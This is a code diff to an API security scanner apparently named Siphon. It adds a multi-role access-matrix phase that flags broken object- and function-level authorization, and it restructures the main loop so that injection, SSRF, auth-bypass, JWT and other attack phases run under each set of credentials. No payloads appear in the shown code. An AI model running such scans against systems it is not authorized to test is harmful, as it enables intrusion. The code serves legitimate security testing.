+                severity="MEDIUM",
+                url=ep["url"],
+                detail=(
+                    f"Endpoint {ep['method']} {ep['path']} returned HTTP "
+                    f"{unauth['status']} without authentication, but returns 2xx "
+                    f"when authenticated. This indicates missing or insufficient "
+                    f"access control."
+                ),
+                evidence=f"URL: {ep['url']} | Unauth status: {unauth['status']}",
+                remediation=(
+                    "Enforce authentication checks on all non-public endpoints. "
+                    "Verify authorization middleware is applied globally."
+                ),
+                extra={
+                    "owasp":   "API1:2023 Broken Object Level Authorization",
+                    "nist":    "AC-3",
+                    "command": f"{ep['method']} {ep['url']} (no auth)",
+                },
+            )
+
+        # Finding 2: BFLA — lower-privilege role accessing endpoint exclusive to most-privileged
+        if most_privileged and len(cred_roles) > 1:
+            high_accessible = ep_access.get(most_privileged, {}).get("accessible")
+            if high_accessible:
+                for low_role in cred_roles:
+                    if low_role == most_privileged:
+                        continue
+                    low_accessible = ep_access.get(low_role, {}).get("accessible")
+                    if low_accessible:
+                        output.add_finding(
+                            phase="access_matrix",
+                            title=(
+                                f"BFLA: Role '{low_role}' Can Access "
+                                f"Admin Endpoint {ep['method']} {ep['path']}"
+                            ),
+                            severity="HIGH",
+                            url=ep["url"],
+                            detail=(
+                                f"Role '{low_role}' (lower privilege) can access "
+                                f"{ep['method']} {ep['path']} which is also accessible "
+                                f"to '{most_privileged}' (most privileged role). "
+                                f"No effective function-level authorization is enforced."
+                            ),
+                            evidence=(
+                                f"URL: {ep['url']} | "
+                                f"{most_privileged}: HTTP {ep_access[most_privileged]['status']} | "
+                                f"{low_role}: HTTP {ep_access[low_role]['status']}"
+                            ),
+                            remediation=(
+                                f"Implement role-based access control. Only allow "
+                                f"'{most_privileged}' to access privileged endpoints."
+                            ),
+                            extra={
+                                "owasp":   "API5:2023 Broken Function Level Authorization",
+                                "nist":    "AC-6",
+                                "command": f"{ep['method']} {ep['url']} (role: {low_role})",
+                            },
+                        )
+
+    # ── Write access_matrix.json ──────────────────────────────────────────────
+    access_matrix = {
+        "roles":            all_roles,
+        "most_privileged":  most_privileged,
+        "privilege_counts": privilege_counts,
+        "endpoints":        endpoint_access,
+    }
+    matrix_path = project_dir / "access_matrix.json"
+    try:
+        matrix_path.write_text(json.dumps(access_matrix, indent=2))
+        con.info(f"  Access matrix saved: {matrix_path}")
+    except Exception as exc:
+        con.err(f"  Failed to save access_matrix.json: {exc}")
+
+    unauth_count = sum(
+        1 for ep in endpoint_access
+        if ep["access"].get("unauthenticated", {}).get("accessible")
+        and any(ep["access"].get(r, {}).get("accessible") for r in cred_roles)
+    )
+    con.info(f"  Unauthenticated access found on {unauth_count} endpoint(s)")
+    return access_matrix
+
+
+# ---------------------------------------------------------------------------
 # main()
 # ---------------------------------------------------------------------------
 
@@ -7558,17 +7920,286 @@ def main() -> None:
             return False
 
         sess       = _make_session(t_settings)
-        auth_sess  = _build_auth_session(t_settings, "auth")
-        auth2_sess = _build_auth_session(t_settings, "auth2")
+        auth_sess  = _build_auth_session(t_settings, "auth")   # primary user session (privilege phases)
+        auth2_sess = _build_auth_session(t_settings, "auth2")  # secondary user (cross_user)
 
-        if auth_sess:
-            con.info("Auth     : enabled (primary)")
-        if auth2_sess:
-            con.info("Auth2    : enabled (secondary)")
+        # ------------------------------------------------------------------
+        # Build per-credential contexts from auth_matrix + unauthenticated.
+        # All non-privilege phases run once per context so that vulnerabilities
+        # reachable only under elevated credentials are not missed.
+        # Privilege-escalation phases (BOLA, BFLA, cross_user, access_matrix)
+        # run once after all contexts — they require cross-role comparison and
+        # must not be executed with a single elevated identity.
+        # ------------------------------------------------------------------
+        _cred_contexts: list = []
+        for _rc in (t_scan.get("auth_matrix") or []):
+            _r_label = _rc.get("role") or f"ctx{len(_cred_contexts) + 1}"
+            _r_s = copy.deepcopy(t_settings)
+            _r_auth = copy.deepcopy(_r_s["scan"].get("auth", {}))
+            _r_auth["enabled"]  = True
+            _r_auth["username"] = _rc.get("username", "")
+            _r_auth["password"] = _rc.get("password", "")
+            _r_s["scan"]["auth"] = _r_auth
+            _r_as = _build_auth_session(_r_s)
+            _cred_contexts.append({"label": _r_label, "settings": _r_s, "auth_sess": _r_as})
+        # Unauthenticated context always last
+        _cred_contexts.append({"label": "unauthenticated", "settings": t_settings, "auth_sess": None})
 
         api_inventory: list = []
+        _inv_seen:     set  = set()
 
-        con.section(f"Siphon — {raw_url}")
+        # TLS is server-side — run once before the credential loop
+        if phases_cfg.get("tls", True) and not pm.is_phase_complete("tls"):
+            con.section(f"Siphon — {raw_url} [tls]")
+            pm.set_phase_status("tls", "running", VantageConsole._PHASE_LABELS.get("tls", "tls"))
+            try:
+                phase_tls(t_settings, output)
+                pm.set_phase_status("tls", "complete", VantageConsole._PHASE_LABELS.get("tls", "tls"))
+            except Exception as _e:
+                con.err(f"Phase tls error: {_e}")
+                pm.set_phase_status("tls", "error", detail=str(_e))
+        elif not phases_cfg.get("tls", True):
+            con.status("tls", "skip", "Disabled in settings")
+
+        if _shutdown_requested:
+            output.save_all(api_inventory)
+            output.print_summary()
+            sys.exit(0)
+
+        # ── Per-credential context loop ──────────────────────────────────
+        for _ctx in _cred_contexts:
+            _ctx_label = _ctx["label"]
+            _ctx_auth  = _ctx["auth_sess"]
+            _ctx_s     = _ctx["settings"]
+
+            if _ctx_auth:
+                con.info(f"Auth [{_ctx_label}]: enabled")
+            else:
+                con.info(f"Auth [{_ctx_label}]: none")
+
+            con.section(f"Siphon — {raw_url} [{_ctx_label}]")
+
+            # Closures capture _ctx_label via default arg to avoid late-binding
+            def _skip(phase: str, _lbl: str = _ctx_label) -> bool:
+                if not phases_cfg.get(phase, True):
+                    con.status(phase, "skip", "Disabled in settings")
+                    return True
+                if pm.is_phase_complete(f"{phase}#{_lbl}"):
+                    con.status(phase, "skip", "Already complete (checkpoint)")
+                    return True
+                return False
+
+            def _run_phase(phase: str, fn, *args, _lbl: str = _ctx_label) -> None:
+                pm.set_phase_status(f"{phase}#{_lbl}", "running",
+                                    VantageConsole._PHASE_LABELS.get(phase, phase))
+                try:
+                    fn(*args)
+                    pm.set_phase_status(f"{phase}#{_lbl}", "complete",
+                                        VantageConsole._PHASE_LABELS.get(phase, phase))
+                except Exception as exc:
+                    con.err(f"Phase {phase} [{_lbl}] error: {exc}")
+                    pm.set_phase_status(f"{phase}#{_lbl}", "error", detail=str(exc))
+
+            def _run_phase_ret(phase: str, fn, *args, _lbl: str = _ctx_label):
+                pm.set_phase_status(f"{phase}#{_lbl}", "running",
+                                    VantageConsole._PHASE_LABELS.get(phase, phase))
+                try:
+                    result = fn(*args)
+                    pm.set_phase_status(f"{phase}#{_lbl}", "complete",
+                                        VantageConsole._PHASE_LABELS.get(phase, phase))
+                    return result
+                except Exception as exc:
+                    con.err(f"Phase {phase} [{_lbl}] error: {exc}")
+                    pm.set_phase_status(f"{phase}#{_lbl}", "error", detail=str(exc))
+                    return None
+
+            # Phase 0: Discovery — accumulate endpoints across contexts
+            if not _skip("discovery"):
+                _disc = _run_phase_ret("discovery", phase_discovery, _ctx_s, sess, output)
+                if _disc:
+                    for _ep in _disc:
+                        _ek = (_ep.get("method"), _ep.get("path"))
+                        if _ek not in _inv_seen:
+                            _inv_seen.add(_ek)
+                            api_inventory.append(_ep)
+
+            if _shutdown_requested:
+                output.save_all(api_inventory)
+                output.print_summary()
+                sys.exit(0)
+
+            # Phase 1: Recon
+            if not _skip("recon"):
+                _run_phase("recon", phase_recon, _ctx_s, sess, output)
+
+            if _shutdown_requested:
+                output.save_all(api_inventory)
+                output.print_summary()
+                sys.exit(0)
+
+            # Phase 2: Fuzzing
+            if not _skip("fuzzing"):
+                _run_phase("fuzzing", phase_fuzzing, _ctx_s, sess, output, api_inventory)
+
+            if _shutdown_requested:
+                output.save_all(api_inventory)
+                output.print_summary()
+                sys.exit(0)
+
+            # Phase 3: Injection
+            if not _skip("injection"):
+                _run_phase("injection", phase_injection, _ctx_s, sess, output, api_inventory, _ctx_auth)
+
+            if _shutdown_requested:
+                output.save_all(api_inventory)
+                output.print_summary()
+                sys.exit(0)
+
+            # Phase 4: Auth Bypass
+            if not _skip("auth_bypass"):
+                _run_phase("auth_bypass", phase_auth_bypass,
+                           _ctx_s, sess, _ctx_auth, output, api_inventory)
+
+            if _shutdown_requested:
+                output.save_all(api_inventory)
+                output.print_summary()
+                sys.exit(0)
+
+            # Phase 5: Rate Limiting
+            if not _skip("rate_limiting"):
+                _run_phase("rate_limiting", phase_rate_limiting,
+                           _ctx_s, sess, output, api_inventory)
+
+            if _shutdown_requested:
+                output.save_all(api_inventory)
+                output.print_summary()
+                sys.exit(0)
+
+            # Phase 6: Mass Assignment
+            if not _skip("mass_assignment"):
+                _run_phase("mass_assignment", phase_mass_assignment,
+                           _ctx_s, sess, _ctx_auth, output, api_inventory)
+
+            if _shutdown_requested:
+                output.save_all(api_inventory)
+                output.print_summary()
+                sys.exit(0)
+
+            # Phase 7: SSRF
+            if not _skip("ssrf"):
+                _run_phase("ssrf", phase_ssrf, _ctx_s, sess, _ctx_auth, output, api_inventory)
+
+            if _shutdown_requested:
+                output.save_all(api_inventory)
+                output.print_summary()
+                sys.exit(0)
+
+            # Phase 8: Data Exposure
+            if not _skip("data_exposure"):
+                _run_phase("data_exposure", phase_data_exposure,
+                           _ctx_s, sess, _ctx_auth, output, api_inventory)
+
+            if _shutdown_requested:
+                output.save_all(api_inventory)
+                output.print_summary()
+                sys.exit(0)
+
+            # Phase 9: GraphQL
+            if not _skip("graphql"):
+                _run_phase("graphql", phase_graphql, _ctx_s, sess, _ctx_auth, output)
+
+            if _shutdown_requested:
+                output.save_all(api_inventory)
+                output.print_summary()
+                sys.exit(0)
+
+            # Phase 9b: Business Flows
+            if not _skip("business_flows"):
+                _run_phase("business_flows", phase_business_flows,
+                           _ctx_s, sess, _ctx_auth, output, api_inventory)
+
+            if _shutdown_requested:
+                output.save_all(api_inventory)
+                output.print_summary()
+                sys.exit(0)
+
+            # Phase 13: Session
+            if not _skip("session"):
+                _run_phase("session", phase_session, _ctx_s, _ctx_auth, output, api_inventory)
+
+            if _shutdown_requested:
+                output.save_all(api_inventory)
+                output.print_summary()
+                sys.exit(0)
+
+            # Phase 14: JWT
+            if not _skip("jwt"):
+                _run_phase("jwt", phase_jwt, _ctx_s, _ctx_auth, output, api_inventory)
+
+            if _shutdown_requested:
+                output.save_all(api_inventory)
+                output.print_summary()
+                sys.exit(0)
+
+            # Phase 15: Sensitive Files
+            if not _skip("sensitive_files"):
+                _run_phase("sensitive_files", phase_sensitive_files, _ctx_s, sess, output)
+
+            if _shutdown_requested:
+                output.save_all(api_inventory)
+                output.print_summary()
+                sys.exit(0)
+
+            # Phase 16b: Unsafe Consumption
+            if not _skip("unsafe_consumption"):
+                _run_phase("unsafe_consumption", phase_unsafe_consumption,
+                           _ctx_s, sess, _ctx_auth, output, api_inventory)
+
+            if _shutdown_requested:
+                output.save_all(api_inventory)
+                output.print_summary()
+                sys.exit(0)
+
+            # Phase 17: Verb Tampering
+            if not _skip("verb_tampering"):
+                _run_phase("verb_tampering", phase_verb_tampering,
+                           _ctx_s, sess, _ctx_auth, output, api_inventory)
+
+            if _shutdown_requested:
+                output.save_all(api_inventory)
+                output.print_summary()
+                sys.exit(0)
+
+            # Phase 18: SOAP / WS-Security
+            if not _skip("soap"):
+                _run_phase("soap", phase_soap, _ctx_s, sess, output)
+
+            if _shutdown_requested:
+                output.save_all(api_inventory)
+                output.print_summary()
+                sys.exit(0)
+
+            # Phase 19: File Upload Endpoint Detection
+            if not _skip("file_upload_info"):
+                _run_phase("file_upload_info", phase_file_upload_info,
+                           _ctx_s, sess, _ctx_auth, output, api_inventory)
+
+            if _shutdown_requested:
+                output.save_all(api_inventory)
+                output.print_summary()
+                sys.exit(0)
+
+        # ── Post-context: privilege-escalation / cross-credential phases ────────
+        con.section(f"Siphon — {raw_url} [privilege-escalation]")
+
+        def _skip(phase: str) -> bool:
+            if not phases_cfg.get(phase, True):
+                con.status(phase, "skip", "Disabled in settings")
+                return True
+            if pm.is_phase_complete(phase):
+                con.status(phase, "skip", "Already complete (checkpoint)")
+                return True
+            return False
 
         def _run_phase(phase: str, fn, *args) -> None:
             pm.set_phase_status(phase, "running",
@@ -7581,146 +8212,7 @@ def main() -> None:
                 con.err(f"Phase {phase} error: {exc}")
                 pm.set_phase_status(phase, "error", detail=str(exc))
 
-        def _run_phase_ret(phase: str, fn, *args):
-            pm.set_phase_status(phase, "running",
-                                VantageConsole._PHASE_LABELS.get(phase, phase))
-            try:
-                result = fn(*args)
-                pm.set_phase_status(phase, "complete",
-                                    VantageConsole._PHASE_LABELS.get(phase, phase))
-                return result
-            except Exception as exc:
-                con.err(f"Phase {phase} error: {exc}")
-                pm.set_phase_status(phase, "error", detail=str(exc))
-                return None
-
-        # ------------------------------------------------------------------
-        # Phase 0: Discovery
-        # ------------------------------------------------------------------
-        if not _skip("discovery"):
-            result = _run_phase_ret("discovery", phase_discovery, t_settings, sess, output)
-            if result is not None:
-                api_inventory = result
-
-        if _shutdown_requested:
-            output.save_all(api_inventory)
-            output.print_summary()
-            sys.exit(0)
-
-        # ------------------------------------------------------------------
-        # Phase 1: Recon
-        # ------------------------------------------------------------------
-        if not _skip("recon"):
-            _run_phase("recon", phase_recon, t_settings, sess, output)
-
-        if _shutdown_requested:
-            output.save_all(api_inventory)
-            output.print_summary()
-            sys.exit(0)
-
-        # ------------------------------------------------------------------
-        # Phase 2: Fuzzing
-        # ------------------------------------------------------------------
-        if not _skip("fuzzing"):
-            _run_phase("fuzzing", phase_fuzzing, t_settings, sess, output, api_inventory)
-
-        if _shutdown_requested:
-            output.save_all(api_inventory)
-            output.print_summary()
-            sys.exit(0)
-
-        # ------------------------------------------------------------------
-        # Phase 3: Injection
-        # ------------------------------------------------------------------
-        if not _skip("injection"):
-            _run_phase("injection", phase_injection, t_settings, sess, output, api_inventory)
-
-        if _shutdown_requested:
-            output.save_all(api_inventory)
-            output.print_summary()
-            sys.exit(0)
-
-        # ------------------------------------------------------------------
-        # Phase 4: Auth Bypass
-        # ------------------------------------------------------------------
-        if not _skip("auth_bypass"):
-            _run_phase("auth_bypass", phase_auth_bypass, t_settings, sess, auth_sess, output, api_inventory)
-
-        if _shutdown_requested:
-            output.save_all(api_inventory)
-            output.print_summary()
-            sys.exit(0)
-
-        # ------------------------------------------------------------------
-        # Phase 5: Rate Limiting
-        # ------------------------------------------------------------------
-        if not _skip("rate_limiting"):
-            _run_phase("rate_limiting", phase_rate_limiting, t_settings, sess, output, api_inventory)
-
-        if _shutdown_requested:
-            output.save_all(api_inventory)
-            output.print_summary()
-            sys.exit(0)
-
-        # ------------------------------------------------------------------
-        # Phase 6: Mass Assignment
-        # ------------------------------------------------------------------
-        if not _skip("mass_assignment"):
-            _run_phase("mass_assignment", phase_mass_assignment, t_settings, sess, auth_sess, output, api_inventory)
-
-        if _shutdown_requested:
-            output.save_all(api_inventory)
-            output.print_summary()
-            sys.exit(0)
-
-        # ------------------------------------------------------------------
-        # Phase 7: SSRF
-        # ------------------------------------------------------------------
-        if not _skip("ssrf"):
-            _run_phase("ssrf", phase_ssrf, t_settings, sess, auth_sess, output, api_inventory)
-
-        if _shutdown_requested:
-            output.save_all(api_inventory)
-            output.print_summary()
-            sys.exit(0)
-
-        # ------------------------------------------------------------------
-        # Phase 8: Data Exposure
-        # ------------------------------------------------------------------
-        if not _skip("data_exposure"):
-            _run_phase("data_exposure", phase_data_exposure, t_settings, sess, auth_sess, output, api_inventory)
-
-        if _shutdown_requested:
-            output.save_all(api_inventory)
-            output.print_summary()
-            sys.exit(0)
-
-        # ------------------------------------------------------------------
-        # Phase 9: GraphQL
-        # ------------------------------------------------------------------
-        if not _skip("graphql"):
-            _run_phase("graphql", phase_graphql, t_settings, sess, auth_sess, output)
-
-        if _shutdown_requested:
-            output.save_all(api_inventory)
-            output.print_summary()
-            sys.exit(0)
-
-        # ------------------------------------------------------------------
-        # Phase 9b: Business Flows
-        # ------------------------------------------------------------------
-        if not _skip("business_flows"):
-            _run_phase("business_flows", phase_business_flows,
-                       t_settings, sess, auth_sess, output, api_inventory)
-
-        if _shutdown_requested:
-            output.save_all(api_inventory)
-            output.print_summary()
-            sys.exit(0)
-
-        # ------------------------------------------------------------------
         # Phase 10: BOLA
-        # ------------------------------------------------------------------
         if not _skip("bola"):
             _run_phase("bola", phase_bola, t_settings, auth_sess, output, api_inventory)
 
@@ -7729,9 +8221,7 @@ def main() -> None:
             output.print_summary()
             sys.exit(0)
 
-        # ------------------------------------------------------------------
         # Phase 11: BFLA
-        # ------------------------------------------------------------------
         if not _skip("bfla"):
             _run_phase("bfla", phase_bfla, t_settings, auth_sess, output, api_inventory)
 
@@ -7740,102 +8230,21 @@ def main() -> None:
             output.print_summary()
             sys.exit(0)
 
-        # ------------------------------------------------------------------
         # Phase 12: Cross-User
-        # ------------------------------------------------------------------
         if not _skip("cross_user"):
-            _run_phase("cross_user", phase_cross_user, t_settings, auth_sess, auth2_sess, output, api_inventory)
+            _run_phase("cross_user", phase_cross_user,
+                       t_settings, auth_sess, auth2_sess, output, api_inventory)
 
         if _shutdown_requested:
             output.save_all(api_inventory)
             output.print_summary()
             sys.exit(0)
 
-        # ------------------------------------------------------------------
-        # Phase 13: Session
-        # ------------------------------------------------------------------
-        if not _skip("session"):
-            _run_phase("session", phase_session, t_settings, auth_sess, output, api_inventory)
-
-        if _shutdown_requested:
-            output.save_all(api_inventory)
-            output.print_summary()
-            sys.exit(0)
-
-        # ------------------------------------------------------------------
-        # Phase 14: JWT
-        # ------------------------------------------------------------------
-        if not _skip("jwt"):
-            _run_phase("jwt", phase_jwt, t_settings, auth_sess, output, api_inventory)
-
-        if _shutdown_requested:
-            output.save_all(api_inventory)
-            output.print_summary()
-            sys.exit(0)
-
-        # ------------------------------------------------------------------
-        # Phase 15: Sensitive Files
-        # ------------------------------------------------------------------
-        if not _skip("sensitive_files"):
-            _run_phase("sensitive_files", phase_sensitive_files, t_settings, sess, output)
-
-        if _shutdown_requested:
-            output.save_all(api_inventory)
-            output.print_summary()
-            sys.exit(0)
-
-        # ------------------------------------------------------------------
-        # Phase 16: TLS
-        # ------------------------------------------------------------------
-        if not _skip("tls"):
-            _run_phase("tls", phase_tls, t_settings, output)
-
-        if _shutdown_requested:
-            output.save_all(api_inventory)
-            output.print_summary()
-            sys.exit(0)
-
-        # ------------------------------------------------------------------
-        # Phase 16b: Unsafe Consumption
-        # ------------------------------------------------------------------
-        if not _skip("unsafe_consumption"):
-            _run_phase("unsafe_consumption", phase_unsafe_consumption,
-                       t_settings, sess, auth_sess, output, api_inventory)
-
-        if _shutdown_requested:
-            output.save_all(api_inventory)
-            output.print_summary()
-            sys.exit(0)
-
-        # ------------------------------------------------------------------
-        # Phase 17: Verb Tampering
-        # ------------------------------------------------------------------
-        if not _skip("verb_tampering"):
-            _run_phase("verb_tampering", phase_verb_tampering,
-                       t_settings, sess, auth_sess, output, api_inventory)
-
-        if _shutdown_requested:
-            output.save_all(api_inventory)
-            output.print_summary()
-            sys.exit(0)
-
-        # ------------------------------------------------------------------
-        # Phase 18: SOAP / WS-Security
-        # ------------------------------------------------------------------
-        if not _skip("soap"):
-            _run_phase("soap", phase_soap, t_settings, sess, output)
-
-        if _shutdown_requested:
-            output.save_all(api_inventory)
-            output.print_summary()
-            sys.exit(0)
-
-        # ------------------------------------------------------------------
-        # Phase 19: File Upload Endpoint Detection (Informational)
-        # ------------------------------------------------------------------
-        if not _skip("file_upload_info"):
-            _run_phase("file_upload_info", phase_file_upload_info,
-                       t_settings, sess, auth_sess, output, api_inventory)
+        # Phase 20: Multi-credential access matrix
+        _auth_matrix_cfg = t_scan.get("auth_matrix", [])
+        if not _skip("access_matrix") and (_auth_matrix_cfg or phases_cfg.get("access_matrix")):
+            _run_phase("access_matrix", phase_access_matrix,
+                       t_settings, output, api_inventory)
 
         # ------------------------------------------------------------------
         # Save results for this target
